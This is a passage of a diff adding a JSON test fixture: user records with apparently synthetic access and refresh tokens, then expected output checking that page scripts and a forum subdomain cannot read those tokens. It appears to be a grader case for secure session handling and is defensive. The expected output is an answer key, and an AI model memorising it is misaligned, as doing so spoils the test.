+                  "id": "u_1042",
+                  "displayName": "Linh Le (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_RPcywmmEJf4nvCJnCsRnI76ENSRLgv2ZG1FC213P908",
+                  "refreshToken": "rt_9LDBxdgFYNiYtbQRNv8goDSSdqhsh1KI0eXhNMXXN4I"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1043",
+                  "displayName": "Duc Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_CPghoJlgMDMSkhXfNNspyut6t4YOt2vigKHPecjN81k",
+                  "refreshToken": "rt_cBrgZuIeq2t__fu53QsOn2IAwKaYvMDSKzbnH9vkzE8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1044",
+                  "displayName": "An Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_bZaU6KNQshv_QxbECh4atSDlITWckLtebhDliogQ0WQ",
+                  "refreshToken": "rt_U0P_Kh6NEOzJmRpTAZ01kF5diHfp7bbz6nntCpvX4Ss"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1045",
+                  "displayName": "Bao Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_5CbOhR2NAI0DvO3k3X1ZMfolsuM1BumCCNpxci6TLFk",
+                  "refreshToken": "rt_ExvWyQ8xcLB3Xl7eIPX-IOrj02LQDKay6u3BDb07q4M"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1046",
+                  "displayName": "Chi Le"
+                },
+                "tokens": {
+                  "accessToken": "at_31evWAI4soJ7kxi9RXCHyiax7bWKuPpU-Z8OQ3oyRDM",
+                  "refreshToken": "rt_4-bqV2TM-RZV7F9h8NuAXKpPxTwfDGUbbr-LJ_3iXao"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1047",
+                  "displayName": "Phuong Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_Aj2sh4jCe_NT-Lvy2ID0rsF92dBE8gUR0c66wncBQos",
+                  "refreshToken": "rt_6rmWmGVjwaIbC9HJrrR8QF8EQGedlBNzmgxydu3ZLN8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1048",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_X_jQViGFpLzvx038l-pIykJzgMgZw2zJ15bSR3Em_DU",
+                  "refreshToken": "rt_LUjdrOsXvjwpJwsVM5JOSOgcZV7Quw5XiPkWRcKvTxc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1049",
+                  "displayName": "Minh Tran (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_elRCYHqIz2_Swjz_RUcremnWTftiLr3zMGwzD3yHYVs",
+                  "refreshToken": "rt_92iEcnspT-9dyiOnRVMxm94B-W45wSlZ5ORvBGQEA3E"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1050",
+                  "displayName": "Thu Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_nTuuUgUoUmoemzCKNTOhjZWof6LHawVMkoEiChHLmyA",
+                  "refreshToken": "rt_zYxftjDMf_26xSQBJdP1FEOEwR5Ht52dU80lx9wjTPE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1051",
+                  "displayName": "Huy Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_o6SYLSNNYQ5496FpSZBo-Vmcr3quTK7gPVj2gt5UmjQ",
+                  "refreshToken": "rt_k4ab5mOPaN8_EDs6Y3dxjhRxcEEhYTWlcpgsAQh8OM4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1052",
+                  "displayName": "Mai Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_I8IuRc5QBML-urOQD8WD0Ug4MQmpgslpbQcndimtu2g",
+                  "refreshToken": "rt_m1cBtgZs0BOhbGE0F9DekdmFfJb3_J-hzTN3lpprwNc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1053",
+                  "displayName": "Khoa Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_vTz5FdXJzDagAqs1TewRdz55W9UL_ST6CkS_UCo6FUk",
+                  "refreshToken": "rt_l6YqpgSfVLfKxQ0CnBw1SnWpQZfOXyCgRPbSdISm7Nw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1054",
+                  "displayName": "Linh Le"
+                },
+                "tokens": {
+                  "accessToken": "at_ECY8aYn5aX2-9eIsw7DdlOG0Qnj5K4G-n16ssyRGAdY",
+                  "refreshToken": "rt_WcHA3OLe55tsZw8njo9c2sSAFNSoIaftuuzgRNYKcLM"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1055",
+                  "displayName": "Duc Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_HMM6-tvm4M33-Tm9nDJI2bS5lJwehlgHb-s8rO5Bst4",
+                  "refreshToken": "rt_rYbq9Uj3CGD46QeZLlHEMXtGVcYy_HHblqdIk_wtRtc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1056",
+                  "displayName": "An Nguyen (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_eZe6pueanxGlim9Qn0p2bqyPGB8hdR4TFQuFx2wr-nc",
+                  "refreshToken": "rt_8FvmgMLCWWVCUWhDMkd1zX5w8sYWZ-QShHSXj-3ye4o"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1057",
+                  "displayName": "Bao Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_YPNkwAcYRlkZExt3hI0H4pnjUQ5T9REzsKtO51f9U6w",
+                  "refreshToken": "rt_cwdHJGOo4pSv_z2c8er3ddtsRRfCavJ0nxZl22OaXMc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1058",
+                  "displayName": "Chi Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_mk4ys3X4w3uc7_UFtTLCRhnwWwDbKUrQm7nBQ5hy-D0",
+                  "refreshToken": "rt_ILsxH94M6w5PtolJKPytvz7CejxBSRedtxUVLVWzJec"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1059",
+                  "displayName": "Phuong Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_30xyBQ2tkhUhi5IFikAVjSZsks_y3fhqKN1ldnEMRx0",
+                  "refreshToken": "rt_t_ziO-l-2hWXE3iq2fKJWOqE3qnIwVRs9P78SnW24Zs"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1060",
+                  "displayName": "Lan Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_LTh8rxv1inGAlvqcMmu2jHblk5Pj388A11HjbcDe-64",
+                  "refreshToken": "rt_EeBFCqP5gTtZs75WmC9y_buEvEba-HcT1woxqLUKjDA"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1061",
+                  "displayName": "Minh Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_OONUVjUwGpAZTr6cHAaAorWGOHHCNMLc-hXQY-101-I",
+                  "refreshToken": "rt_rok-Vi2PcMfveP7ohVKAxudyzVkxx19FWsQyy78Mh-8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1062",
+                  "displayName": "Thu Le"
+                },
+                "tokens": {
+                  "accessToken": "at_9E8d3UNk9OJx8wdkfzvSA1Rl4V_ipyEgJ8Jd2CbWqUc",
+                  "refreshToken": "rt_p-JIlcJvokcoKgDRJuO5O6VE4WG6bPsL3AJzicRgUIg"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1063",
+                  "displayName": "Huy Bui (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_wY3a5PpGcm5PXHh0QVmY9INqKfwmND1QxayqdUCzNQ4",
+                  "refreshToken": "rt_Sn4fsqRVsvnR7-sXMQuJHCOc5tLjj4_9aFEsh7OcknM"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1064",
+                  "displayName": "Mai Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_KLzccj0ODuIMoUa63v6ptsggXIEPtlyt3gj_QDQR9W0",
+                  "refreshToken": "rt_jW1_voAAPjM3lV6_j9Yt_jYFcVlniUzPOJMZbxQUzao"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1065",
+                  "displayName": "Khoa Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_3sKJ94TdaUCBAqJxgnwbD0nJjGKZ1JlTLgEll7GgK0o",
+                  "refreshToken": "rt_x4pFFJ9yQ5f1O5IUuVTiObmKJmrFCBkveYcV00JmWC4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1066",
+                  "displayName": "Linh Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_y5EAb5Sl2KDAWqD91zjgxZd7Geu8JbnhEDwnqDDXzO4",
+                  "refreshToken": "rt_7Wm4QJmQ1WdW8VWddEUyDaDVNAv_ebapztjuV-rl1D0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1067",
+                  "displayName": "Duc Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_lQwDIUDpy2Xy4Seau8Pr8WYPoMZ1v9C_jdUEXB9sTaQ",
+                  "refreshToken": "rt_TYhx_f4sGfsa-m_vB0Uo4Nfa6v_swg2O-5TSz6Lwnyo"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1068",
+                  "displayName": "An Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_B6z5KxIj70CVu5CJV8jA3om5ThRiIVtgHxpA7sj3wTw",
+                  "refreshToken": "rt_wWNaJY-Lh9lipTdjVVhiAouqHUpsBjGuaU1RgGZ6k_Q"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1069",
+                  "displayName": "Bao Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_xOZpdA7nsueb3DWgzZtMJZVXUII7g8XE-D19dmB7MUs",
+                  "refreshToken": "rt_Apj2Wt5p5ZVSrTY1cNBTYlaP9qnzbZtXmJFRzT4Nx2M"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1070",
+                  "displayName": "Chi Dang (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_eVp-6jjINXyJiT3RE0kLBbtpNK_V7KxPZG0K1XfzvY0",
+                  "refreshToken": "rt_2qCArxTkveeK54fD_5eZG9X191TBHzusauqLeeiYIxU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1071",
+                  "displayName": "Phuong Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_tl5IpSl_yzrZS-sI6T5K229CgPJ_0aDC5DWbFvlU40I",
+                  "refreshToken": "rt_vrFAjBR_KUuD5-jw2phfMOd6Ax4XyOKP9H5lOEytNsU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1072",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_3evB9n9OzhwLfcfZ8UjKFqWVdAY7OxfTeiusI0Ck7kM",
+                  "refreshToken": "rt_AGbXVzFisMSl26x_Hf4XY6kfgZKjFiTLHUWLJ4OGYr8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1073",
+                  "displayName": "Minh Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_DGFkvHgJMPQL5NfdeZwDAxmHF1r8P01OMjLVWWIbkg8",
+                  "refreshToken": "rt_3AI-G44VYbB84tcwkGCOp4G6-qYaHfkx2AN1Zy7vPTg"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1074",
+                  "displayName": "Thu Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_xnB2Obhns7gUrWEQDzzBC99IYyijRd8b7TFmDIiaWxk",
+                  "refreshToken": "rt_3VbljgD-95a2QbRDP3Ak8OxKc7q0BCIrakQbC0GShLQ"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1075",
+                  "displayName": "Huy Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_91Jj1MWgR-T4kglo4kYXuFcl05p2v8ItqPCCO_CFo8w",
+                  "refreshToken": "rt_5oQUqVJWKEz7v2fqIlpJfNM35OVUowVsP0arfFA-iKg"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1076",
+                  "displayName": "Mai Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_TUf16P8jkLtMJ_HUp5wBKBUg3z6cH_sFExQ18vcR7UU",
+                  "refreshToken": "rt_Y4-o_nkTs5Un3UoGlckgiU2Tgq9-mSIjqexryClGXls"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1077",
+                  "displayName": "Khoa Vo (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_TWO2uFmBk7wrM7xI_JHrAHGqh78mwh-qmJI_udMXXKg",
+                  "refreshToken": "rt_WkDLYhRU0uUPWxOprfGtXH_1AjQYWZKnZO4Z5Jw48Xw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1078",
+                  "displayName": "Linh Le"
+                },
+                "tokens": {
+                  "accessToken": "at_Yy2Y5cAlk4QS5S3tEO9eXfI73MMfpfJtJSalfor_hdw",
+                  "refreshToken": "rt_vyP_Lss1ra0Tz23HO_UpqtpaBJGNpMQZ4uNPHu3IEmE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1079",
+                  "displayName": "Duc Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_-_idlcwsvJxg2P5BOGU66_6oy0msuA_voHasajH3Hik",
+                  "refreshToken": "rt_BMC7Pjg8YxFT2geqTvPzdDaFLmjETHp5Nw0K4thkQhE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1080",
+                  "displayName": "An Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_o_8CiOHNPR3VHr5QXr5c3BpYMTclV_c7RDn9n91gcdo",
+                  "refreshToken": "rt_tnSOXBu958B14jNLudwRBLuUzRr7uACvuidY2ZidH_c"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1081",
+                  "displayName": "Bao Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_CBptDjnu90nrE8uGAWkyqLNynHMJ9Puv2JTzVCru9-o",
+                  "refreshToken": "rt_4ozSVmu-rwcIlIameT9dzplrKUKN38W5bncFbfjOb5Y"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1082",
+                  "displayName": "Chi Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_d-e0ME-R09K1Y3K7wNGmoRwkX8tMcU20Sd1jBv_5g9Y",
+                  "refreshToken": "rt_nJxNjOZ2h2WThf2sB6D8le9HzFmqOM6ekTpiB73d6PI"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1083",
+                  "displayName": "Phuong Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_-jEB4Kw9cYdbd5IqdL9Zc3bdIEpTPp46nfFKNFDkGB4",
+                  "refreshToken": "rt_9sytYmV1nfzu2_rVyM5jsa4yHVGbdxeBIJ82APLRqQQ"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1084",
+                  "displayName": "Lan Hoang (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_h1YVgHJdpjbNaTnHAz7n7B4X5gXejQWGlx9gVt8i3Fc",
+                  "refreshToken": "rt_xH4KLwqT4ajDTpoji7EgbWIesCQXjdXeD7Ch9FzUn-8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1085",
+                  "displayName": "Minh Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_wjgdSEjRCY0YMRvQ-yadZ_teK0WTfUqR53fN8k0Fo2o",
+                  "refreshToken": "rt_9defp6ujDXjXLO4oxNk6cygFSjxZt1HaJ1g-DDCtWnk"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1086",
+                  "displayName": "Thu Le"
+                },
+                "tokens": {
+                  "accessToken": "at_o5NP5mGMeB1T5l83apnSbchPXRzucE91GMQwuejLYXs",
+                  "refreshToken": "rt_spuVVSdkds1glvyakP3pN9s2UAn6nxm1JmrO4l4I2WU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1087",
+                  "displayName": "Huy Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_pCwYLgqaV-GTzLW8UQYk6vjDYG_1KkhZxMKlFewtCQg",
+                  "refreshToken": "rt_-nkLjX2Umld8zDLzeQPUFPYPP3HImxpXKHVmgLIJMTs"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1088",
+                  "displayName": "Mai Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_9XmOSg5NZ4EHTQw0VMu0lINDwCs-MzXlEFRcrF_Ho1c",
+                  "refreshToken": "rt_p5eZQmQzdm5WPDEyroMya9hBqwCC-_OUClMBdBVh5Bc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1089",
+                  "displayName": "Khoa Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_QRx7xRhZteMpH0aUc50ww8NbYp2zv4ychfzACo9f_kM",
+                  "refreshToken": "rt_XXydfG-v2MawDqA7pdjnSZ-KdcX_vtERcRjrhtx5JWU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1090",
+                  "displayName": "Linh Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_3XC4JDKeEuEzHcwL3xL2Ua47VvWadHMylfIMBuCZST4",
+                  "refreshToken": "rt_s9tmAWN4J4nk2waF4ohQBm8KO0K5OLjjKd0bdPxgvQg"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1091",
+                  "displayName": "Duc Pham (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_LuToQRKTSlUi4rDIDFetZRAi7H1bKvkDEjuudRqravs",
+                  "refreshToken": "rt_hvc1G-r0u6f-DAfg7iOABw5lyrUZxUEYOViwPEKSVYs"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1092",
+                  "displayName": "An Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_ncQSxvEOgyl3ecRRR9Hs89vvXBflEr_S4AKY0IE7eWU",
+                  "refreshToken": "rt_Etbv0O0fx0il6QjB6srseOImeCcI6ZajEisM4MkPHl0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1093",
+                  "displayName": "Bao Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_bL1gh9hmNJwaJ3ElbF3BAOophGVKeGDa7dXbki_QpX0",
+                  "refreshToken": "rt_3P1HFWGCjIi8BrIJQQF6bl3YWiORt_bsBPbqGqbzz8U"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1094",
+                  "displayName": "Chi Le"
+                },
+                "tokens": {
+                  "accessToken": "at_6Mf89ifJfi1Cm5zg4iK81Gu9AjDgbNRTMD1dXmQ-dso",
+                  "refreshToken": "rt_xyE211fRblPxWtvykq-9zt5_2jXk-qYe6rhBXWPVbqQ"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1095",
+                  "displayName": "Phuong Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_EaxvdCXf8glDLEfKA0LmVcWCPaqs6m4QjJk6qP7WEHE",
+                  "refreshToken": "rt_a4jM0G52F4gq9NU82LXf5J6IfzjwF01xUaWJiTLEha4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1096",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_3yFD03otsdzjAfWbCgmgF2gdHyzAvolM-0jAS86eU5I",
+                  "refreshToken": "rt_NyiFs13t1zcGc4nivMHSRuu7anR640Y0LYd7gboiUf4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1097",
+                  "displayName": "Minh Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_uQNqdaJMADe0QD79RFWYI3qM8GTodu-91763q5lstU8",
+                  "refreshToken": "rt_SOtZsioiHcZkynv6_oKKI-Ld0gEt_5k1Yu-FbQkOr3M"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1098",
+                  "displayName": "Thu Le (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_kO49S50lDCF6jtZt7chwlb50WrsvOaLTuNfdOVra5ow",
+                  "refreshToken": "rt_YbRRSCSxGQFkZhpvwP-l9uqX_Z6oYIINYIhE3fyVbpI"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1099",
+                  "displayName": "Huy Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_XtemU6cnYvH4XJ3FuWztwYdi8b_2b7NEodh4AazzfNY",
+                  "refreshToken": "rt_ZndWV36MiJBfN1EcasJrovJ56kqY9V-OaD55yNzu16I"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1100",
+                  "displayName": "Mai Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_DxEc2MspObsHWFCneRH_CHn6lzcJV1kI9Jz6tv7tSpQ",
+                  "refreshToken": "rt_BQjyysOuxkw7PnlqxjH63NgTY8iYAzWS5E7jFnGi2EY"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1101",
+                  "displayName": "Khoa Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_XNh7rlHHuPmLFdVS2uHJw0zkopjaArjmZBBcRgfYvtI",
+                  "refreshToken": "rt_EICeSxlDG8-O2wMq4Y1VZ4QsUA0aWFjUm1W6FJueAjM"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1102",
+                  "displayName": "Linh Le"
+                },
+                "tokens": {
+                  "accessToken": "at_yH2iYnfcdrHwf4tJah3DQqPJR5zV5Kul3VdXNGAVdvk",
+                  "refreshToken": "rt_uLH1CyLzb6OyXaPiZeq5y0h6Df-NtkWJUmB1D70DU5A"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1103",
+                  "displayName": "Duc Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_WLtBJ-dL6PN2lU_6ZLgLfDkzSVrNMrjSsxrVOOM0J28",
+                  "refreshToken": "rt_YiXci5otndtg-xpQKvcooZp1KJUnFAYFPFXUaV3Mv3Y"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1104",
+                  "displayName": "An Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_7AjKlSzMrnMR3O1myZJDthzIXKvJvzQtghkUmURaeH4",
+                  "refreshToken": "rt_mG6LNhNXXBuyd61XtKZ9mrB4Hg83LaTPLeIr_27SDgU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1105",
+                  "displayName": "Bao Tran (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_1VEzhFrzSg3vHxADg0_NGZmiBvEigtj1SRVv46aF7nw",
+                  "refreshToken": "rt_b5Rp9hH_SSBvo4WNBQdiWNM2IG9y7PKEeflae7bvf-Q"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1106",
+                  "displayName": "Chi Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_1GSPMxi9DZT43CHX8Pn3JYDSa97TU86MZFIf_whNNDw",
+                  "refreshToken": "rt_cgkHEDOw3AnDDpzd-rR2V5gylt2wX5a1M_syTvkkgS4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1107",
+                  "displayName": "Phuong Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_JJ7GeCgkERek6PPVa_xQnDZgc0EaIEzoT0dBuC6TohM",
+                  "refreshToken": "rt_oVu8t76xw770xrL4CusfQyv1MlIl1uUQaCjoZhHYoqw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1108",
+                  "displayName": "Lan Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_mvP5KT30IP2aQDmIKZxNtq4IaB8JKm-XEKIggQBUa8c",
+                  "refreshToken": "rt_4KW-xZPWWRd-j1puzowHDpoPySb_XY7gSmQ1zFXuI6A"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1109",
+                  "displayName": "Minh Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_7v-W8xR1mTLjktfPbyD1Y0k4yyA-610UXrwUqDuOZvc",
+                  "refreshToken": "rt_V90qDoNN9ccAw4ODwH2AB6KlKmNRmx1_ueibxrnEfH0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1110",
+                  "displayName": "Thu Le"
+                },
+                "tokens": {
+                  "accessToken": "at__7kD1Oo1kA9Z1BSKxs54NpxB8NBLIXOcXD_Ga9lti4g",
+                  "refreshToken": "rt_5eRK1y0CxvpYmZFyKP5ioDgkV8rAbtUV8LXIbmthYZU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1111",
+                  "displayName": "Huy Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_i1WyxMIiXUK0x-ktKklyeqD-cQjKHgZxwfCel3VONKk",
+                  "refreshToken": "rt_o9K0ChLlpjwdaovRVeCpB2RAt0YIYwKNatThxXYtrXw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1112",
+                  "displayName": "Mai Nguyen (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_T0LYRt9neqkzEYaE3EoLba3MnUQ1dg3mQE4KbYtDOPI",
+                  "refreshToken": "rt_y6w9fxFO2YggWvNEriTpQIi9QySduKTTiwTVOt0cnDA"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1113",
+                  "displayName": "Khoa Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_yWUft7cjj81F1QbPnoselKb5KMBulws-WBfGJaRWxsA",
+                  "refreshToken": "rt_gJ4gXbypj0fMROVdD7MJqqPWYFS4RxGnL180JZP2jZw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1114",
+                  "displayName": "Linh Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_HZn34GB38MCmFRUC0VRvtCtjdJDm22nEraIzeFsSBiU",
+                  "refreshToken": "rt_XVF6xGfE89BVZNA5B2Fgal3eg6yPtZ846TCvg0QvN5w"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1115",
+                  "displayName": "Duc Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_f4FHPjXlwK87QJJs9FUy4zXGuqEemRts-BOxcB1D9HM",
+                  "refreshToken": "rt_d9mxZLULsoX6O2FBkL7kg3DVYKgbYK-09veTvXD766k"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1116",
+                  "displayName": "An Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_MTOAdyrrRnW3-zthMhfH9CBFTFhynoIBLpW1Rt0Cxu4",
+                  "refreshToken": "rt_IE9HU86QTP2EZjGMtnvbexIkaxLgtWgN5lXskvQtz4g"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1117",
+                  "displayName": "Bao Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_-kpK7JoVubZ5WR5H8eEAnVhNODYYmwIS5qmY2sd-TZ8",
+                  "refreshToken": "rt_KTexrtUUeXTTZEnx1VqxecnAZFoZaHdHyEtKWXy9juw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1118",
+                  "displayName": "Chi Le"
+                },
+                "tokens": {
+                  "accessToken": "at_UMZGSqcdZbD2M5xdcHcvKw2f3rdBI0BBsp4BTrrhSMI",
+                  "refreshToken": "rt_tEk8-ix0EHGuS_hLvimqfjZn_wx-RZcHY2fAIvI4uws"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1119",
+                  "displayName": "Phuong Bui (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_FbHtQbPtqESNzNukTtT-CpsE5HA5uR4GH1VevGhRYV0",
+                  "refreshToken": "rt_yrezm5_29okyj5tNgSDXMwuOrcTpFk4eBneRoQJfc34"
+                }
+              }
+            ],
+            "probes": [
+              "me",
+              "script",
+              "forum"
+            ]
+          },
+          "expected": "u_1000 login: 200, SPA shows \"Hi, Lan Nguyen (mentor)\"\nu_1000 GET /me: 200\nu_1000 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1000 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1001 login: 200, SPA shows \"Hi, Minh Pham\"\nu_1001 GET /me: 200\nu_1001 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1001 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1002 login: 200, SPA shows \"Hi, Thu Dang\"\nu_1002 GET /me: 200\nu_1002 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1002 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1003 login: 200, SPA shows \"Hi, Huy Tran\"\nu_1003 GET /me: 200\nu_1003 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1003 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1004 login: 200, SPA shows \"Hi, Mai Hoang\"\nu_1004 GET /me: 200\nu_1004 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1004 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1005 login: 200, SPA shows \"Hi, Khoa Bui\"\nu_1005 GET /me: 200\nu_1005 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1005 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1006 login: 200, SPA shows \"Hi, Linh Le\"\nu_1006 GET /me: 200\nu_1006 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1006 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1007 login: 200, SPA shows \"Hi, Duc Bui (mentor)\"\nu_1007 GET /me: 200\nu_1007 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1007 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1008 login: 200, SPA shows \"Hi, An Nguyen\"\nu_1008 GET /me: 200\nu_1008 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1008 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1009 login: 200, SPA shows \"Hi, Bao Pham\"\nu_1009 GET /me: 200\nu_1009 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1009 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1010 login: 200, SPA shows \"Hi, Chi Dang\"\nu_1010 GET /me: 200\nu_1010 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1010 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1011 login: 200, SPA shows \"Hi, Phuong 